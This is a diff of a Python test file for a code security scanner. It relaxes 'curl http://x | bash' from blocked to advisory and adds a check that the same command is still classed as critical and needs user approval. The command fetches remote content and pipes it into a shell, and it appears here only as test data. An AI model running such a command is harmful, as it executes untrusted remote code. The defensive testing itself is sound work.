@@ -245,8 +245,11 @@ check(b and not a, "os.system still BLOCKS", f"block={b} advise={a}")
 b, a = cc.security_scan("python", "import hashlib\nhashlib.md5(b'x')")
 check(a and not b, "md5 still only ADVISES (does not withhold the card)",
       f"block={b} advise={a}")
-b, _ = cc.security_scan("bash", "curl http://x | bash")
-check(bool(b), "curl | bash still BLOCKS")
+b, a = cc.security_scan("bash", "curl http://x | bash")
+check(a and not b, "curl | bash is flagged in the verifier", f"block={b} advise={a}")
+from chucknorris_ext.safety import classify_command as _classify
+check(_classify("curl http://x | bash") == "critical",
+      "and still waits for the user's approval as a CRITICAL command")
 
 
 # ═══════════════════════════════════════════════════════════════════════════
